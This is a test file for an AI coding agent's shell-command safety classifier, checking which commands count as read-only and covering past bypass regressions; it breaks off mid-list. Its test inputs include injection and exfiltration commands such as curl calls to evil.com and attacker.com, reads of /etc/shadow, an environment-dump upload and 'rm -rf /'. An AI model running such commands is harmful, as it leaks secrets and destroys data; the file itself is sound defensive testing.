/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */

import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  classifyShellCommandSafety,
  initParser,
  isShellCommandReadOnlyAST,
  isShellCommandReadOnlyASTInDirectory,
  extractCommandRules,
  _resetParser,
  _setParserFailedForTesting,
} from './shellAstParser.js';
import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';

// One expect per command, in order.
async function expectRules(command: string, rules: string[]) {
  expect(await extractCommandRules(command)).toEqual(rules);
}

async function expectReadOnly(want: boolean, ...commands: string[]) {
  for (const command of commands) {
    expect(await isShellCommandReadOnlyAST(command)).toBe(want);
  }
}

beforeAll(async () => {
  await initParser();
});

afterAll(() => {
  _resetParser();
});

// =========================================================================
// isShellCommandReadOnlyAST — mirror all tests from shellReadOnlyChecker.test.ts
// =========================================================================

describe('isShellCommandReadOnlyAST', () => {
  it.each<[string, boolean, ...string[]]>([
    ['allows simple read-only command', true, 'ls -la'],
    ['rejects mutating commands like rm', false, 'rm -rf temp'],
    ['rejects redirection output', false, 'ls > out.txt'],
    ['rejects command substitution', false, 'echo $(touch file)'],
  ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));

  it('rejects the two substitution forms from issue #8582', async () => {
    for (const command of [
      'echo "$\\\n(touch /tmp/pwned)"',
      'echo "${one="$"}${two="$one(touch /tmp/pwned)"}${two@P}"',
    ]) {
      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
      expect(await classifyShellCommandSafety(command)).toBe('unknown');
    }
  });

  it('keeps literal twins of issue #8582 read-only', async () => {
    await expectReadOnly(
      true,
      'echo "\\$\\\n(touch /tmp/pwned)"',
      'echo "$$\\\n(touch /tmp/pwned)"',
      "echo '$\\\n(touch /tmp/pwned)'",
      "echo '${two@P}'",
      'echo "${two@Q}"',
    );
  });

  describe('repository-local Git config (#8575)', () => {
    const tempDirs: string[] = [];
    const createRepo = (): string => {
      const dir = mkdtempSync(path.join(tmpdir(), 'qwen-git-config-'));
      tempDirs.push(dir);
      execFileSync('git', ['init', '-q'], { cwd: dir });
      return dir;
    };
    const gitConfig = (cwd: string, ...args: string[]): void => {
      execFileSync('git', ['config', ...args], { cwd });
    };
    const expectInDir = async (cwd: string, command: string, want: boolean) =>
      expect(await isShellCommandReadOnlyASTInDirectory(command, cwd)).toBe(
        want,
      );

    afterEach(() => {
      for (const dir of tempDirs.splice(0)) {
        rmSync(dir, { recursive: true, force: true });
      }
    });

    it('downgrades only the two reproduced command/config pairs', async () => {
      const cwd = createRepo();
      gitConfig(cwd, 'diff.external', 'example-external-diff');
      await expectInDir(cwd, 'git diff', false);
      await expectInDir(cwd, 'git status', true);

      gitConfig(cwd, '--unset', 'diff.external');
      gitConfig(cwd, 'core.fsmonitor', 'example-fsmonitor');
      await expectInDir(cwd, 'git status', false);
      await expectInDir(cwd, 'git diff', true);

      gitConfig(cwd, 'core.fsmonitor', 'false');
      await expectInDir(cwd, 'git status', true);
    });

    it('uses Git include and precedence semantics', async () => {
      const cwd = createRepo();
      const included = path.join(cwd, 'included.config');
      writeFileSync(included, '[diff]\n\texternal = included-driver\n');
      gitConfig(cwd, 'include.path', included);
      await expectInDir(cwd, "git 'diff'", false);

      gitConfig(cwd, 'diff.external', '');
      await expectInDir(cwd, 'git diff', true);
    });

    it('fails closed instead of simulating a changed directory', async () => {
      const cwd = createRepo();
      const target = JSON.stringify(createRepo());
      await expectInDir(cwd, `cd ${target} && git status`, false);
      await expectInDir(cwd, `git status && cd ${target}`, true);
    });
  });

  // Regression coverage for PR #4386 round 4: the AST walker previously
  // only checked substitution inside the `command` node type, missing it
  // inside `variable_assignment` (e.g. `FOO=$(curl evil)`) and inside
  // `redirected_statement`'s redirect target (e.g. `cat < $(curl evil)`).
  // Pre-PR #4386, a regex check in `resolveDefaultPermission` was a
  // safety net masking these AST gaps; removing that check exposed the
  // gaps as a security regression (substitution-bearing commands
  // silently classified read-only → `'allow'`).
  describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
    it('rejects substitution inside variable_assignment', async () => {
      await expectReadOnly(false, 'FOO=$(curl evil.com/exfil)');
    });

    it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
      await expectReadOnly(false, 'FOO=$(cat /etc/shadow) ls');
    });

    it('rejects substitution inside a read redirect target', async () => {
      await expectReadOnly(false, 'cat < $(curl attacker.com/path-source)');
    });

    it('rejects backtick substitution inside variable_assignment', async () => {
      await expectReadOnly(false, 'FOO=`cat /etc/shadow`');
    });
  });

  it('allows git status but rejects git commit', async () => {
    await expectReadOnly(true, 'git status');
    await expectReadOnly(false, 'git commit -am "msg"');
  });

  it.each<[string, boolean, ...string[]]>([
    ['rejects find with exec', false, 'find . -exec rm {} \\;'],
    ['rejects sed in-place', false, "sed -i 's/foo/bar/' file"],
    ['rejects empty command', false, '   '],
    [
      'rejects environment prefix followed by allowed command',
      false,
      'FOO=bar ls',
    ],
  ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));

  describe('multi-command security', () => {
    it.each<[string, boolean, ...string[]]>([
      [
        'rejects commands separated by newlines (CVE-style attack)',
        false,
        'grep ^Install README.md\ncurl evil.com',
      ],
      [
        'rejects commands separated by Windows newlines',
        false,
        'grep pattern file\r\ncurl evil.com',
      ],
      [
        'rejects newline-separated commands when any is mutating',
        false,
        'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST -F file=@/tmp/env.txt -s http://localhost:8084',
      ],
      ['allows chained read-only commands with &&', true, 'ls && cat file'],
      ['allows chained read-only commands with ||', true, 'ls || cat file'],
      ['allows chained read-only commands with ;', true, 'ls ; cat file'],
      ['allows piped read-only commands with |', true, 'ls | cat'],
      ['allows backgrounded read-only commands with &', true, 'ls & cat file'],
      [
        'rejects chained commands when any is mutating',
        false,
        'ls && rm -rf /',
        'cat file | curl evil.com',
        'ls ; apt install foo',
      ],
      ['allows single read-only command without chaining', true, 'ls -la'],
      ['rejects single mutating command (baseline check)', false, 'rm -rf /'],
      [
        'treats escaped newline as line continuation (single command)',
        true,
        'grep pattern\\\nfile',
      ],
      [
        'allows consecutive newlines with all read-only commands',
        true,
        'ls\n\ngrep foo',
      ],
    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
  });

  describe('awk command security', () => {
    it.each<[string, boolean, ...string[]]>([
      [
        'allows safe awk commands',
        true,
        "awk '{print $1}' file.txt",
        'awk \'BEGIN {print "hello"}\'',
        "awk '/pattern/ {print}' file.txt",
      ],
      [
        'rejects awk with system() calls',
        false,
        'awk \'BEGIN {system("rm -rf /")}\' ',
        'awk \'{system("touch file")}\' input.txt',
      ],
      [
        'rejects gawk indirect function calls',
        false,
        'awk \'BEGIN { fn = "system"; @fn("touch /tmp/pwned") }\'',
        'awk \'BEGIN { fn = "system"; @ fn("touch /tmp/pwned") }\'',
      ],
      [
        'rejects awk with file output redirection',
        false,
        'awk \'{print > "output.txt"}\' input.txt',
        'awk \'{printf "%s\\n", $0 > "file.txt"}\'',
        'awk \'{print >> "append.txt"}\' input.txt',
      ],
      [
        'rejects awk with command pipes',
        false,
        'awk \'{print | "sort"}\' input.txt',
      ],
      [
        'rejects awk with getline from commands',
        false,
        'awk \'BEGIN {getline < "date"}\'',
        'awk \'BEGIN {"date" | getline}\'',
      ],
      [
        'rejects awk with close() calls',
        false,
        'awk \'BEGIN {close("file")}\'',
      ],
    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
  });

  describe('sed command security', () => {
    it.each<[string, boolean, ...string[]]>([
      [
        'allows safe sed commands',
        true,
        "sed 's/foo/bar/' file.txt",
        "sed -n '1,5p' file.txt",
      ],
      ['rejects sed with execute command', false, "sed 's/foo/bar/e' file.txt"],
      [
        'rejects sed with write command',
        false,
        "sed 's/foo/bar/w output.txt' file.txt",
      ],
      [
        'rejects sed with read command',
        false,
        "sed 's/foo/bar/r input.txt' file.txt",
      ],
      [
        'still rejects sed in-place editing',
        false,
        "sed -i 's/foo/bar/' file.txt",
        "sed --in-place 's/foo/bar/' file.txt",
      ],
    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
  });

  // =======================================================================
  // Additional AST-specific edge cases
  // =======================================================================

  describe('AST-specific edge cases', () => {
    it.each<[string, boolean, ...string[]]>([
      ['rejects backtick command substitution', false, 'echo `rm -rf /`'],
      // process_substitution is conservatively handled as command_substitution
      ['rejects process substitution with write', false, 'diff <(ls) <(ls -a)'],
      ['allows pure variable assignment', true, 'FOO=bar'],
      ['rejects multiple env vars before command', false, 'A=1 B=2 ls -la'],
      ['rejects function definitions', false, 'foo() { rm -rf /; }'],
      ['allows git diff', true, 'git diff --word-diff=color -- file.txt'],
      ['allows git log', true, 'git log --oneline -10'],
      ['rejects git push', false, 'git push origin main'],
      ['allows git --version / --help', true, 'git --version', 'git --help'],
      ['allows input redirection (read-only)', true, 'cat < input.txt'],
      ['rejects append redirection', false, 'echo hello >> out.txt'],
      ['allows here-string', true, 'cat <<< "hello"'],
      ['rejects nested command substitution', false, 'echo $(echo $(rm foo))'],
      [
        'allows complex pipeline of read-only commands',
        true,
        'find . -name "*.ts" | grep -v node_modules | sort | head -20',
      ],
      [
        'rejects pipeline with mutating command',
        false,
        'find . -name "*.ts" | xargs rm',
      ],
      [
        'allows git branch (no mutating flags)',
        true,
        'git branch',
        'git branch -a',
      ],
      ['rejects git branch -d', false, 'git branch -d feature'],
      ['allows git remote (no mutating action)', true, 'git remote -v'],
      ['rejects git remote add', false, 'git remote add origin url'],
    ])('%s', (_title, want, ...commands) => expectReadOnly(want, ...commands));
  });
});

// =========================================================================
// classifyShellCommandSafety
// =========================================================================

describe('classifyShellCommandSafety', () => {
  // Budget for `process.cpuUsage()`, which is process-wide: it sums user +
  // system across every thread for the window, so V8's background GC and JIT
  // threads and the parser runtime's own threads are charged to it alongside
  // the work under test. Measured against the built package on an idle
  // machine, that reports 2.1-3.1x the wall time of the same commands -- 2.1x
  // even when they run sequentially, so the inflation is the accounting, not
  // the `Promise.all` fan-out below. The 1000 this replaces was a wall-clock
  // number carried over unchanged when the metric changed, which put it below
  // the floor of what a healthy run reports: ~270 ms here, 1232-1361 ms on
  // GitHub-hosted runners.
  //
  // These tests guard against catastrophic backtracking on 10k-repetition
  // adversarial inputs, which costs orders of magnitude rather than a small
  // multiple, so the headroom below does not blunt them.
  const maxClassificationCpuMs = 4000;
  const expectClassifiedWithinBudget = async (
    commands: string[],
    expected: string[],
  ) => {
    const startedCpuUsage = process.cpuUsage();
    await expect(
      Promise.all(commands.map(classifyShellCommandSafety)),
    ).resolves.toEqual(expected);
    const cpuUsage = process.cpuUsage(startedCpuUsage);
    expect((cpuUsage.user + cpuUsage.system) / 1000).toBeLessThan(
      maxClassificationCpuMs,
    );
  };

  it.each([
    'ls -la',
    'git status --short',
    'ls | cat && pwd',
    'FOO=bar',
    'cd /tmp',
    '(git status)',
    '{ ls; pwd; }',
    'cat < input.txt',
    'cat <<EOF\nhello\nEOF',
    'echo 2>&1',
    'echo >&-',
    'uniq input.txt',
    'uniq -- -f',
    'git branch --list --color=always topic',
    'git diff -o patch',
    'git diff -Oorderfile',
    'git log -p',
    'git show -p HEAD',
    'git blame -p file',
    'git log -- --output=log.out',
    'sort -- -o output',
    'tree -- -o output',
    'rg -- -z file',
    'sort -- -roout input',
    'sort -- --output=out',
    "sed -- 's/a/b/' input",
    "sed 's/a/*/' file",
    "sed 's/old/new/' file",
    "sed 's/hello/world/' file",
    "sed 's/error/warning/g' file",
    "sed -n '/needle/p' file",
    "sed --quiet 's/a/b/' file",
    "sed --silent 's/a/b/' file",
    "sed '/pattern/d' file",
    "sed 's/a/woutput/' file",
    "sed 's#x#s/a/b/woutput#' file",
    "sed 's#x#foo;woutput#' file",
    "sed 'p;d' file",
    "awk '{ print*2 }' file",
    "awk -- '{ print }' input",
    "awk -F : '{ print $1 }' input",
    'awk \'BEGIN { print "user@example.com" }\'',
    "printf '%s' value",
  ])('classifies %j as read-only', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('read-only');
  });

  it.each([
    ...'chgrp chmod chown cp install ln mkdir mkfifo mknod mv rename rm rmdir shred touch truncate unlink'
      .split(' ')
      .map((root) => `${root} target`),
    ...'add am checkout cherry-pick clean clone commit fetch gc init merge mv pull push rebase reset restore revert rm stash switch'
      .split(' ')
      .map((subcommand) => `git ${subcommand} target`),
    'kill 123',
    'kill -- -0',
    'kill "$PID"',
    'pkill -n 0',
    'pkill -n0 process',
    'pkill -s0 process',
    'pkill -s 0 process',
    'pkill -s "$SESSION" process',
    'killall -n0 process',
    'echo > out',
    '> out',
    'export FOO=bar > out',
    'echo >> out',
    'echo >| out',
    'echo &> out',
    'echo &>> out',
    'echo >& out',
    '> out echo',
    'git commit -m message',
    'git commit -m --help',
    'git commit -F --help',
    'git commit -C --help',
    'git commit -c --help',
    'git commit --reuse-message --help',
    'git commit --fixup --help',
    'git commit -m --dry-run',
    'git commit -n -m message',
    "git commit -m '%G?'",
    'git add -- --help',
    'git add -- --dry-run',
    'touch -- --help',
    'git fetch -n origin',
    'git branch topic',
    'git branch -- topic',
    'git branch --color=always color-topic',
    'git branch --column column-topic',
    'git branch --sort=refname sort-topic',
    "git branch --format='%(refname)' format-topic",
    'git branch -v verbose-topic',
    'git branch --delete topic',
    'git branch -uorigin/main topic',
    'git branch --format --help -d topic',
    'git branch --sort --version --delete topic',
    'git remote set-url origin url',
    'git remote rm origin',
    'git remote prune origin',
    'git diff --output=patch',
    'git log --output=log.out',
    'git show --output=show.out HEAD',
    'git log --output --help',
    'find . -delete',
    'find . -fprint matches',
    'find . -fprint --help',
    'find . -fls --help',
    'find . -fprintf --help format',
    'find . -exec rm {} \\;',
    'find . -exec echo --help {} \\; -delete',
    'find . -exec echo --version {} \\; -delete',
    "sed -i 's/a/b/' file",
    'sed -f script.sed -i file',
    'sed --file=script.sed --in-place=.bak file',
    "sed -- 'wout' input",
    "sed -- 's/a/b/wout' input",
    "sed -I .bak 's/a/b/' file",
    "sed -I.bak 's/a/b/' file",
    "sed -ni.bak 's/a/b/' file",
    "sed -nI.bak 's/a/b/' file",
    "sed 's/a/b/w output' file",
    "sed --quiet 'w output' file",
    "sed --silent 'w output' file",
    "sed -e 's/a/b/' -e 'woutput' file",
    "sed 's/a/b/woutput' file",
    "sed 'woutput' file",
    "sed '1woutput' file",
    "sed '/pattern/woutput' file",
    "sed 'W output' file",
    "sed '1W output' file",
    "sed 'p;w output' file",
    "sed 's/a/b/;w output' file",
    "sed 's/a/;/;w output' file",
    "sed -l 80 'w output' file",
    "sed --line-length 80 'w output' file",
    'awk \'{ print > "output" }\' file',
    'awk -- \'BEGIN { print > "out" }\'',
    'awk \'BEGIN { print "x" > "out" }\'',
    'awk \'BEGIN { printf "%s", "x" > "out" }\'',
    'awk \'BEGIN { print a[x] > "out" }\'',
    'awk \'{ print>"output" }\' file',
    'awk -v mode=1 \'BEGIN { print > "out" }\' input',
    'awk \'/pattern/ { print > "out" }\' input',
    'sort -o output input',
    'sort -o --help input',
    'tree -o tree.txt',
    'tree -o --help .',
    'uniq input output',
    'uniq - output',
    'uniq -- -f output',
    'uniq input -- -f',
    'tee output',
    'tee -- -output',
    'tee -a -- -output',
    'dd if=input of=output',
    'echo $(rm target)',
    'FOO=$(rm target)',
    'cat <(rm target)',
    'cat < <(rm target)',
    '< <(rm target) cat',
    '! rm target',
    'cat <<EOF\n$(rm target)\nEOF',
    'FOO=bar rm target',
    'python -c pass; touch target',
    'if true; then rm target; fi',
    'while false; do rm target; done',
    'for item in value; do rm target; done',
  ])('classifies %j as write', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('write');
  });

  it.each([
    '',
    'python -c pass',
    'node -e pass',
    'LS -la',
    'printf -v PATH /tmp',
    'printf -xv PATH /tmp',
    'printf "$OPTIONS" value',
    'printf -v PATH /tmp; ls',
    'sudo ls',
    'bash -c ls',
    '/bin/rm target',
    'rm --help',
    'kill -0 123',
    'kill -n 0 123',
    'kill -n 00 123',
    'kill -n0 123',
    'kill -s0 123',
    'kill --signal 0 123',
    'kill -SIG0 123',
    'kill -s SIG0 123',
    'kill --signal=SIG0 123',
    'kill -l',
    'kill --list=TERM',
    'kill --table',
    'kill -V',
    'killall -help',
    'killall -s0 process',
    'killall -sSIG0 process',
    'pkill -0 process',
    'pkill -SIG0 process',
    'pkill --signal 0 process',
    'pkill --signal SIG0 process',
    'kill -s "$SIGNAL" 123',
    'kill -n "$SIGNAL" 123',
    'kill --signal="$SIGNAL" 123',
    'git clean --dry-run',
    'git commit -m -F --help',
    'git commit -m -F --dry-run',
    'git commit --message --file --help',
    'git commit --untracked-files --help',
    'git --config-env=diff.external=HELPER diff',
    'git --paginate log',
    'git -p log',
    'git --unknown-option status',
    'git -- status',
    'git --help commit',
    'git status --help',
    'git log --help',
    'git diff --help',
    'git log --show-signature -1',
    'git show --format=%G? HEAD',
    'GIT_EXTERNAL_DIFF=/tmp/helper git diff',
    'FOO=bar GIT_EXTERNAL_DIFF=/tmp/helper git diff',
    "GIT_EXTERNAL_DIFF='touch /tmp/pwned'; git diff",
    'FOO=bar; ls',
    'FOO=bar ls',
    'LD_PRELOAD=/tmp/evil.so ls',
    'RIPGREP_CONFIG_PATH=/tmp/config rg pattern',
    'PAGER=helper git log',
    'git add -n target',
    'git branch -d topic --help',
    'git branch --list -- -d',
    'git branch -- --list',
    'git branch --sort refname',
    "git branch --format '%(refname)'",
    'git branch --sort refname topic',
    'git branch --format --delete',
    'git branch --sort -d',
    'git diff --output=',
    'git blame --output=blame.out file',
    'git diff --ext-diff',
    'git show --textconv HEAD:file',
    'git grep --open-files-in-pager=less needle',
    'git grep -Ovim needle',
    'git cat-file --filters HEAD:file',
    'git remote prune --dry-run origin',
    'git remote prune -n origin',
    'git remote show remove',
    'git remote get-url prune',
    'find . -exec echo {} \\;',
    'find . -exec echo -delete \\;',
    'find . -fprint --help --help',
    'find . -name -delete',
    'find . -printf -delete',
    'find . -newermt -delete',
    'find . -samefile -delete',
    'find . -mtime -delete',
    'find . -used -delete',
    'find . -- -delete',
    'find . -exec rm --help \\;',
    'sed -f script.sed file',
    'sed -fscript.sed file',
    "sed --in-pl=.bak 's/a/b/' file",
    'sed --f script.sed file',
    'sed -newout input',
    'sed -nEewout input',
    'sed "$SCRIPT" file',
    'sed -e "$SCRIPT" file',
    'sed s/a/*/ file',
    'sed \'s/a/b/\' "$FILE"',
    "sed -i 's/a/b/' --help",
    'sed -e -i file',
    'sed -einstall file',
    'sed -neinstall file',
    "sed -e '' file",
    'sed -f -i file',
    'sed -e-i file',
    'sed -- -i file',
    "sed 's/a/b/e' file",
    "sed 's/a/printf hacked > marker/ep' file",
    "sed 's#a#printf hacked > marker#pe' file",
    "sed 'etouch marker' file",
    "sed '1etouch marker' file",
    "sed 's/a/b/w' file",
    "sed 'w' file",
    "sed '1w' file",
    "sed 'R input' file",
    "sed 's/a/b/' 'w file'",
    "sed 's/a/new value/' file",
    "sed 's/a/blue sky/' file",
    "sed 's/a/car value/' file",
    "sed 's/w /x/' file",
    "sed '/p;w output/p' file",
    "sed 's/a/;w output/' file",
    'awk \'{ system("date") }\'',
    "awk '{ print > output }' file",
    'awk \'BEGIN { print("x")|"cat > output" }\'',
    'awk \'BEGIN { print(1 > "0") }\'',
    'awk \'BEGIN { printf("%d", 1 > "0") }\'',
    'awk \'BEGIN { print "print > " "output" }\'',
    'awk \'BEGIN { print (x) > "out" }\'',
    'awk \'BEGIN { print +(x > "0") }\'',
    'awk \'BEGIN { print a[x > "0"] }\'',
    'awk \'BEGIN { # print > "out"\nprint }\'',
    'awk \'BEGIN { print /x; print y > "out";/ }\'',
    'awk \'BEGIN { print x / 2 > "out" }\'',
    "awk '{ print }' 'print > \"out\"'",
    'awk -fscript.awk file',
    'awk -W exec=script.awk file',
    'awk -Wexec=script.awk file',
    'awk "$PROGRAM" file',
    'awk \'@include "library.awk"\' file',
    'awk \'@namespace "safe"\' file',
    'awk \'BEGIN { fn = "system"; @fn("touch /tmp/pwned") }\'',
    'awk \'BEGIN { fn = "system"; @ fn("touch /tmp/pwned") }\'',
    "awk -e '{ print }' file",
    "awk --load extension '{ print }' file",
    "awk --profile=report '{ print }' file",
    'awk {print*2} file',
    'awk -v x="$VALUE" \'{ print x }\' file',
    'awk \'{ print $NF }\' "$FILE"',
    'uniq *',
    'uniq "$FILES"',
    'sort "$OPTIONS" input',
    'sort {-o,output} input',
    'sort --out=output input',
    'sort -roout input',
    'tree -Cofile .',
    'sort --co=cat input',
    'tree --output=tree.txt',
    'find . "$EXPRESSION"',
    'rg "$OPTIONS" pattern',
    'git status "$OPTIONS"',
    'sort --compress-program gzip input',
    'sort --output=',
    'sort -o output --help',
    'rg --pre cat pattern',
    'rg --hostname-bin=hostname pattern',
    'rg -z pattern archive.gz',
    'ripgrep -iz pattern archive.gz',
    'rg --search-zip pattern archive.gz',
    'less file',
    'more file',
    'tee',
    'dd if=input',
    'echo >& "$target"',
    'cat <> file',
    'echo >',
    'FOO=bar > out',
    'echo $(git status)',
    'FOO=$(git status)',
    'cat <(git status)',
    'if true; then git status; fi',
    'fn() { rm target; }',
  ])('classifies %j as unknown', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('unknown');
  });

  it.each([
    'rm target',
    'python -c pass',
    'echo $(git status)',
    'if true; then git status; fi',
    'fn() { rm target; }',
    'git push origin main',
    'git branch --list -- -d',
    'find . -exec echo {} \\;',
    "sed 's/a/b/e' file",
    "sed 's/a/b/' 'w file'",
    "sed 's/w /x/' file",
    'awk \'{ system("date") }\'',
    'git remote show remove',
  ])('does not widen the compatibility boolean for %j', async (command) => {
    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
  });

  it('classifies deeply nested substitutions without repeated traversal', async () => {
    let command = 'git status';
    for (let depth = 0; depth < 30; depth++) command = `echo $(${command})`;
    expect(await classifyShellCommandSafety(command)).toBe('unknown');
  });

  it('classifies deeply nested redirected substitutions within the CPU budget', async () => {
    const commands = ['git status', 'git status'];
    for (let depth = 0; depth < 20; depth++) {
      commands[0] = `echo $(${commands[0]}) < /dev/null`;
      commands[1] = `< <(${commands[1]}) cat`;
    }
    await expectClassifiedWithinBudget(commands, ['unknown', 'unknown']);
  });

  it('classifies adversarial rule inputs within the CPU budget', async () => {
    const backslashes = '\\'.repeat(10_000);
    const repeatedSed = 'p;'.repeat(10_000);
    const repeatedPrint = 'print value; '.repeat(10_000);
    const repeatedFindExec = '-exec echo \\; '.repeat(10_000);
    const unmatchedBraces = '\\{'.repeat(10_000);
    const commands = [
      `sed 's/${backslashes}a' file`,
      `sed '${repeatedSed}' file`,
      `awk 'BEGIN { print "${backslashes} > output }'`,
      `awk 'BEGIN { ${repeatedPrint} }'`,
      `find . ${repeatedFindExec}`,
      `git status ${unmatchedBraces}`,
    ];
    await expectClassifiedWithinBudget(commands, [
      'unknown',
      'read-only',
      'unknown',
      'read-only',
      'unknown',
      'read-only',
    ]);
  });
});

// =========================================================================
// extractCommandRules
// =========================================================================

describe('extractCommandRules', () => {
  describe('simple commands', () => {
    it.each<[string, string, string[]]>([
      [
        'extracts root + known subcommand + wildcard',
        'git clone https://github.com/foo/bar.git',
        ['git clone *'],
      ],
      [
        'extracts npm install with wildcard',
        'npm install express',
        ['npm install *'],
      ],
      [
        'extracts npm outdated without wildcard (no extra args)',
        'npm outdated',
        ['npm outdated'],
      ],
      ['extracts cat with wildcard', 'cat /etc/passwd', ['cat *']],
      ['extracts ls with wildcard', 'ls -la /tmp', ['ls *']],
      ['extracts bare command without args', 'whoami', ['whoami']],
      [
        'extracts unknown command with wildcard',
        'curl https://example.com',
        ['curl *'],
      ],
      ['extracts command with only flags', 'ls -la', ['ls *']],
    ])('%s', async (_title, command, rules) => {
      expect(await extractCommandRules(command)).toEqual(rules);
    });
  });

  describe('compound commands', () => {
    it.each<[string, string, string[]]>([
      [
        'extracts rules from && compound',
        'git clone foo && npm install',
        ['git clone *', 'npm install'],
      ],
      [
        'extracts rules from || compound',
        'git pull || git fetch origin',
        ['git pull', 'git fetch *'],
      ],
      ['extracts rules from ; compound', 'ls ; cat file', ['ls', 'cat *']],
      [
        'extracts rules from pipeline',
        'cat file | grep pattern',
        ['cat *', 'grep *'],
      ],
      [
        'deduplicates rules',
        'npm install foo && npm install bar',
        ['npm install *'],
      ],
    ])('%s', async (_title, command, rules) => {
      expect(await extractCommandRules(command)).toEqual(rules);
    });
  });

  describe('docker multi-level subcommands', () => {
    it('extracts docker compose up with args', async () => {
      await expectRules('docker compose up -d', ['docker compose up *']);
    });

    it('extracts docker compose up without args', async () => {
      await expectRules('docker compose up', ['docker compose up']);
    });

    it('extracts docker run with wildcard', async () => {
      await expectRules('docker run -it ubuntu bash', ['docker run *']);
    });
  });

  describe('edge cases', () => {
    it.each<[string, string, string[]]>([
      ['returns empty for empty string', '', []],
      ['returns empty for whitespace', '   ', []],
      ['handles env var prefix', 'FOO=bar npm install', ['npm install']],
      ['handles redirected command', 'echo hello > out.txt', ['echo *']],
      ['handles pure variable assignment (no rule)', 'FOO=bar', []],
      [
        'extracts cargo subcommands',
        'cargo build --release',
        ['cargo build *'],
      ],
      [
        'extracts kubectl subcommands',
        'kubectl get pods -n default',
        ['kubectl get *'],
      ],
      ['extracts pip install', 'pip install requests', ['pip install *']],
      ['extracts pnpm subcommands', 'pnpm add -D typescript', ['pnpm add *']],
    ])('%s', async (_title, command, rules) => {
      expect(await extractCommandRules(command)).toEqual(rules);
    });
  });
});
// =========================================================================
// Fallback: isShellCommandReadOnlyAST falls back to regex when WASM fails
// =========================================================================

describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
  afterEach(() => {
    _resetParser();
  });

  it('returns the regex-based result for a read-only command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    // Both implementations agree: ls is read-only
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('maps parser unavailability to unknown in the classification API', async () => {
    _setParserFailedForTesting();
    expect(await classifyShellCommandSafety('git status')).toBe('unknown');
    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
  });

  it('keeps the Git config gate when the parser is unavailable', async () => {
    const cwd = mkdtempSync(path.join(tmpdir(), 'qwen-git-fallback-'));
    try {
      execFileSync('git', ['init', '-q'], { cwd });
      execFileSync('git', ['config', 'core.fsmonitor', 'example-fsmonitor'], {
        cwd,
      });
      _setParserFailedForTesting();
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
      ).toBe(false);
    } finally {
      rmSync(cwd, { recursive: true, force: true });
    }
  });

  it('treats syntax errors as unknown without widening the boolean API', async () => {
    expect(isShellCommandReadOnly('ls |')).toBe(false);
    expect(await classifyShellCommandSafety('ls |')).toBe('unknown');
    expect(await isShellCommandReadOnlyAST('ls |')).toBe(false);
  });

  it('returns the regex-based result for a mutating command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });

  it('returns regex result for piped read-only commands when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(true);
  });

  it('returns regex result for write-redirection command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('echo hello > out.txt')).toBe(false);
  });

  it('fallback result matches direct regex call', async () => {
    _setParserFailedForTesting();
    const commands = [
      'ls -la',
      'rm -rf /',
      'git status',
      'git push origin main',
      'cat file | grep pattern',
      'echo hello > out.txt',
      'find . -name "*.ts"',
      'find . -exec rm {} \\;',
      "sed -i 's/a/b/' file",
      'FOO=bar ls',
    ];
    for (const cmd of commands) {
      expect(await isShellCommandReadOnlyAST(cmd)).toBe(
        isShellCommandReadOnly(cmd),
      );
    }
  });

  it('re-initialises normally after _resetParser', async () => {
    _setParserFailedForTesting();
    _resetParser();
    await initParser(); // should succeed
    // After reset, AST parser is used again
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });
});

// =========================================================================
// Consistency: isShellCommandReadOnly vs isShellCommandReadOnlyAST
//
// Both implementations must agree on all cases in this suite.
// Cases where a known, intentional divergence exists are labelled with
// [divergence] and include an explanation.
// =========================================================================

describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyAST (AST)', () => {
  // Pairs of [command, expected] where BOTH implementations must return the
  // same result. Drawn from shellReadOnlyChecker.test.ts plus extra cases.
  const sharedCases: Array<[cmd: string, expected: boolean, note?: string]> = [
    // --- basics ---
    ['ls -la', true],
    ['rm -rf temp', false],
    ['ls > out.txt', false],
    ['echo $(touch file)', false],
    ['echo `rm -rf /`', false, 'backtick substitution'],

    // --- git ---
    ['git status', true],
    ['git log --oneline -10', true],
    ['git diff --word-diff=color -- file.txt', true],
    ['git commit -am "msg"', false],
    ['git push origin main', false],
    ['git branch', true],
    ['git branch -d feature', false],
    ['git remote -v', true],
    ['git remote add origin url', false],
    ['git --version', true],

    // --- find ---
    ['find . -name "*.ts"', true],
    ['find . -exec rm {} \\;', false],
    ['find . -execdir ls {} \\;', false],
    ['find . -delete', false],

    // --- sed ---
    ["sed 's/foo/bar/' file.txt", true],
    ["sed -n '1,5p' file.txt", true],
    ["sed -i 's/foo/bar/' file.txt", false],
    ["sed --in-place 's/foo/bar/' file.txt", false],
    ["sed 's/foo/bar/e' file.txt", false, 'e flag executes shell command'],
    ["sed 'e date' file.txt", false],
